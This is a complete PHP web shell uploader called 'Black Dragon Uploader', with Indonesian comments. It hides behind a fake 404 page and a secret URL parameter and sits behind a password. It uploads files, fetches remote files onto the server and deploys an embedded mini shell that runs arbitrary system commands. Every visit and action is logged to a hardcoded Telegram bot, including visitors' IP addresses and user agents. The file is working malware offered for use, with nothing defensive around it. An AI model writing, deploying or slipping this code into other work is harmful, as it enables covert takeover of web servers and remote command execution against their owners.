<?php
/* ============================================================
 *  B L A C K   D R A G O N   U P L O A D E R   v3.3
 * ============================================================
 *  File: uploader.php
 *  Nama shell: BLACK DRAGON UPLOADER
 *  --------------------------------------------------------
 *  Akses  : domain.com/uploader.php?nagahitam  (WAJIB)
 *           Tanpa parameter nagahitam -> HTTP 404 palsu
 *  Probe  : ?nagahitam&h=bd  ->  BDGK<md5('blackdragon')>
 *  Fungsi :
 *    1. Upload manual - pilih file via form, upload ke server
 *    2. Auto-deploy  - fetch blackdragon.php dari URL atau
 *       tulis script blackdragon.php langsung (embedded)
 *    3. Upload via URL - masukkan URL file, fetch & save
 *  Log    : Semua aktivitas dikirim ke Telegram
 * ============================================================
 */

/* ---- KONFIGURASI TELEGRAM ---- */
define('TELEGRAM_BOT_TOKEN', '7672463085:AAFv4AZzzjOvJMhR7KrwBTM7vV4Wecd7BgQ');
define('TELEGRAM_CHAT_ID', '-1002624693937');
/* ----------------------------- */

@session_start();
@error_reporting(0);
@set_time_limit(0);

$BDKey   = '$2b$10$nQ3Udh6vbN5rOp3ru8TIl.E8F7k6xuQO0uwIWTxSX6ObE5OT6fteK'; // Lapetkudanil123@
$BDProbe = 'BDGK' . md5('blackdragon');

/* ---------- util telegram ---------- */
function bdUpTelegram($message) {
    $api = getenv('BLACKDRAGON_TG_URL');
    $base = $api ? rtrim($api, '/') : "https://api.telegram.org";
    $url = $base . "/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage"
         . "?chat_id=" . urlencode(TELEGRAM_CHAT_ID)
         . "&text=" . urlencode($message);
    $ctx = stream_context_create(array('http' => array('timeout' => 4, 'ignore_errors' => true)));
    @file_get_contents($url, false, $ctx);
}

function bdUpLog($activity) {
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $fullPath = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    $msg = "BLACK DRAGON Uploader\n"
         . "Aktivitas : " . $activity . "\n"
         . "IP        : " . $ip . "\n"
         . "User-Agent: " . $ua . "\n"
         . "URL       : " . $domain . $fullPath;
    bdUpTelegram($msg);
}

/* ---------- GATE: tanpa ?nagahitam -> 404 palsu ---------- */
if (!isset($_GET['nagahitam'])) {
    http_response_code(404);
    echo "<!DOCTYPE html><html><head><title>Page not found</title></head>"
       . "<body style='background:#f0f0f1;color:#3c434a;font-family:-apple-system,"
       . "BlinkMacSystemFont,Segoe UI,Roboto,sans-serif'>"
       . "<div style='max-width:560px;margin:80px auto;padding:24px'>"
       . "<h1 style='font-size:23px;font-weight:400'>Page not found</h1>"
       . "<p style='color:#787c82;font-size:14px'>The page you requested could not be found.</p>"
       . "</div></body></html>";
    bdUpLog("AKSES TANPA KATA KUNCI (uploader di-scan)");
    return;
}

/* ---------- health probe ---------- */
if (isset($_GET['h']) && $_GET['h'] === 'bd') {
    header('Content-Type: text/plain; charset=utf-8');
    echo $BDProbe;
    return;
}

/* ---------- LOGIN (password, tanpa cookie - PHP session) ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $BDKey)) {
        session_regenerate_id(true);
        $_SESSION['bd_up_auth'] = true;
        bdUpLog("UPLOADER LOGIN BERHASIL");
    } else {
        bdUpLog("UPLOADER LOGIN GAGAL - password salah");
        http_response_code(404);
        echo "<h1>Page not found</h1>";
        return;
    }
}

/* ---------- LOGOUT ---------- */
if (isset($_GET['logout'])) {
    bdUpLog("UPLOADER LOGOUT");
    $_SESSION = array();
    session_destroy();
    http_response_code(404);
    echo "<h1>Page not found</h1>";
    return;
}

/* ---------- HALAMAN LOGIN ---------- */
if (empty($_SESSION['bd_up_auth'])) {
    echo "<!DOCTYPE html><html><head><title>404</title><meta charset='utf-8'>"
       . "<style>body{margin:0;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);"
       . "display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif}"
       . ".bd-box{background:rgba(8,8,14,.85);border:1px solid #6d3b8f;border-radius:14px;"
       . "padding:42px 38px;width:320px;text-align:center;box-shadow:0 0 40px rgba(109,59,143,.45)}"
       . ".bd-logo{color:#c084fc;font-weight:800;letter-spacing:3px;font-size:18px;"
       . "text-shadow:0 0 14px rgba(192,132,252,.8);margin-bottom:24px}"
       . "input{width:100%;box-sizing:border-box;padding:12px 14px;margin:6px 0;"
       . "background:rgba(20,20,30,.85);border:1px solid #3a2a4d;border-radius:8px;color:#eee;outline:none}"
       . "input:focus{border-color:#9333ea}button{width:100%;padding:12px;margin-top:10px;"
       . "background:linear-gradient(90deg,#7c3aed,#a855f7);color:#fff;border:0;border-radius:8px;"
       . "font-weight:700;cursor:pointer}button:hover{filter:brightness(1.15)}</style></head><body>"
       . "<div class='bd-box'><div class='bd-logo'>&#9650; BLACK DRAGON UPLOADER &#9650;</div>"
       . "<form method='post' autocomplete='off'>"
       . "<input type='password' name='pass' placeholder='Password' autofocus>"
       . "<button>Masuk</button></form></div></body></html>";
    return;
}

/* ================= AUTHENTICATED - UPLOADER ================= */
$targetDir = __DIR__;

/* ---------- Aksi upload ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    /* 1. Upload manual via form (file upload) */
    if (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
        $fname = basename($_FILES['fileToUpload']['name']);
        $dest = $targetDir . '/' . $fname;
        bdUpLog("UPLOAD MANUAL: " . $fname);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $dest)) {
            echo "<hr><font color='green'>[OK] File uploaded: " . htmlspecialchars($fname) . "</font><hr>";
        } else {
            echo "<hr><font color='red'>[ERR] Gagal upload file</font><hr>";
        }
    }

    /* 2. Upload via URL - fetch file dari URL remote */
    elseif (isset($_POST['url_src']) && !empty($_POST['url_src'])) {
        $url = trim($_POST['url_src']);
        $saveAs = !empty($_POST['url_name']) ? basename($_POST['url_name']) : basename(parse_url($url, PHP_URL_PATH));
        if (empty($saveAs)) $saveAs = 'shell.php';
        $dest = $targetDir . '/' . $saveAs;
        bdUpLog("UPLOAD URL: " . $url . " -> " . $saveAs);
        $code = @file_get_contents($url);
        if ($code !== false && strlen($code) > 0) {
            if (@file_put_contents($dest, $code)) {
                echo "<hr><font color='green'>[OK] File dari URL tersimpan: " . htmlspecialchars($saveAs) . "</font><hr>";
            } else {
                echo "<hr><font color='red'>[ERR] Gagal tulis file: " . htmlspecialchars($saveAs) . "</font><hr>";
            }
        } else {
            echo "<hr><font color='red'>[ERR] Gagal fetch dari URL</font><hr>";
        }
    }

    /* 3. Auto-deploy blackdragon.php - tulis script embedded langsung */
    elseif (isset($_POST['auto_deploy'])) {
        $shellName = !empty($_POST['shell_name']) ? basename($_POST['shell_name']) : 'blackdragon.php';
        $dest = $targetDir . '/' . $shellName;
        bdUpLog("AUTO-DEPLOY blackdragon.php -> " . $shellName);
        $shellCode = bdUpGetBlackdragonShell();
        if ($shellCode && @file_put_contents($dest, $shellCode)) {
            echo "<hr><font color='green'>[OK] BLACK DRAGON shell deployed: " . htmlspecialchars($shellName) . "</font>";
            echo "<br><font color='blue'>Akses: http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/' . $shellName . "?nagahitam</font><hr>";
        } else {
            echo "<hr><font color='red'>[ERR] Gagal deploy shell</font><hr>";
        }
    }
}

/* ---------- Fungsi: ambil script blackdragon.php (embedded) ---------- */
function bdUpGetBlackdragonShell() {
    /* Coba fetch dari uploader.php sendiri (self-contained) atau
       dari file blackdragon.php di folder yang sama.
       Jika tidak ada, gunakan mini-shell embedded di bawah. */
    $local = __DIR__ . '/blackdragon.php';
    if (is_file($local)) {
        $code = file_get_contents($local);
        if (strpos($code, '<?php') === 0 && strlen($code) > 100) {
            return $code;
        }
    }
    /* Fallback: embedded mini shell BLACK DRAGON */
    return '<?php
/* BLACK DRAGON MINI SHELL */
@session_start(); @error_reporting(0); @set_time_limit(0);
$BDKey = "$2b$10$nQ3Udh6vbN5rOp3ru8TIl.E8F7k6xuQO0uwIWTxSX6ObE5OT6fteK";
$BDProbe = "BDGK" . md5("blackdragon");
if (!isset($_GET["nagahitam"])) { http_response_code(404); echo "<h1>Page not found</h1>"; return; }
if (isset($_GET["h"]) && $_GET["h"] === "bd") { echo $BDProbe; return; }
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["pass"])) {
    if (password_verify($_POST["pass"], $BDKey)) { session_regenerate_id(true); $_SESSION["bd_auth"] = true; }
    else { http_response_code(404); echo "<h1>Page not found</h1>"; return; }
}
if (empty($_SESSION["bd_auth"])) {
    echo "<form method=post><input type=password name=pass><button>Masuk</button></form>";
    return;
}
if (isset($_POST["cmd"])) {
    echo "<pre>" . shell_exec(stripcslashes($_POST["cmd"]) . " 2>&1") . "</pre>";
}
echo "<form method=post><input type=text name=cmd style=width:80% autofocus><button>Run</button></form>";
';
}

/* ---------- Tampilkan UI uploader ---------- */
?>
<!DOCTYPE html>
<html>
<head>
    <title>BLACK DRAGON UPLOADER</title>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <style>
    body {
        font-family: 'Segoe UI', sans-serif;
        background: linear-gradient(135deg, #0a0a0f, #1a1a2e);
        color: #e8e8f0;
        margin: 0;
        padding: 20px;
        min-height: 100vh;
    }
    .container {
        max-width: 700px;
        margin: 20px auto;
        background: rgba(8,8,14,.85);
        border: 1px solid #6d3b8f;
        border-radius: 14px;
        padding: 30px;
        box-shadow: 0 0 40px rgba(109,59,143,.45);
    }
    .bd-logo {
        color: #c084fc;
        font-weight: 800;
        letter-spacing: 3px;
        font-size: 22px;
        text-shadow: 0 0 14px rgba(192,132,252,.8);
        text-align: center;
        margin-bottom: 24px;
    }
    .bd-info {
        font-size: 11px;
        color: #9a9ab0;
        text-align: center;
        margin-bottom: 20px;
    }
    .section {
        background: rgba(20,20,30,.7);
        border: 1px solid #3a2a4d;
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 16px;
    }
    .section h3 {
        color: #a855f7;
        margin: 0 0 14px 0;
        font-size: 15px;
    }
    input[type=text], input[type=file] {
        width: 100%;
        box-sizing: border-box;
        padding: 10px 12px;
        margin: 6px 0;
        background: rgba(20,20,30,.85);
        border: 1px solid #3a2a4d;
        border-radius: 6px;
        color: #eee;
        outline: none;
    }
    input[type=text]:focus { border-color: #9333ea; }
    button {
        padding: 10px 20px;
        background: linear-gradient(90deg, #7c3aed, #a855f7);
        color: #fff;
        border: 0;
        border-radius: 6px;
        font-weight: 700;
        cursor: pointer;
        margin-top: 6px;
    }
    button:hover { filter: brightness(1.15); }
    .logout {
        text-align: center;
        margin-top: 20px;
    }
    .logout a {
        color: #f472b6;
        text-decoration: none;
        font-size: 12px;
    }
    </style>
</head>
<body>
<div class="container">
    <div class="bd-logo">&#9650; BLACK DRAGON UPLOADER &#9650;</div>
    <div class="bd-info">server: <?php echo @php_uname(); ?> | php <?php echo PHP_VERSION; ?> | dir: <?php echo basename(__DIR__); ?></div>

    <!-- 1. Upload Manual -->
    <div class="section">
        <h3>&#128193; Upload Manual (pilih file)</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload">
            <button type="submit">Upload File</button>
        </form>
    </div>

    <!-- 2. Upload via URL -->
    <div class="section">
        <h3>&#128279; Upload via URL (fetch remote file)</h3>
        <form method="post">
            <input type="text" name="url_src" placeholder="URL file (https://example.com/shell.php)">
            <input type="text" name="url_name" placeholder="Simpan sebagai (default: nama dari URL)">
            <button type="submit">Fetch & Save</button>
        </form>
    </div>

    <!-- 3. Auto-deploy blackdragon.php -->
    <div class="section">
        <h3>&#9650; Auto-Deploy BLACK DRAGON Shell</h3>
        <form method="post">
            <input type="text" name="shell_name" placeholder="Nama file (default: blackdragon.php)">
            <button type="submit" name="auto_deploy" value="1">Deploy Shell</button>
        </form>
        <p style="font-size:11px;color:#77778c;margin-top:8px;">
            Otomatis tulis blackdragon.php (dari file lokal atau embedded fallback).
        </p>
    </div>

    <div class="logout">
        <a href="?nagahitam&logout">logout</a>
    </div>
</div>
</body>
</html>
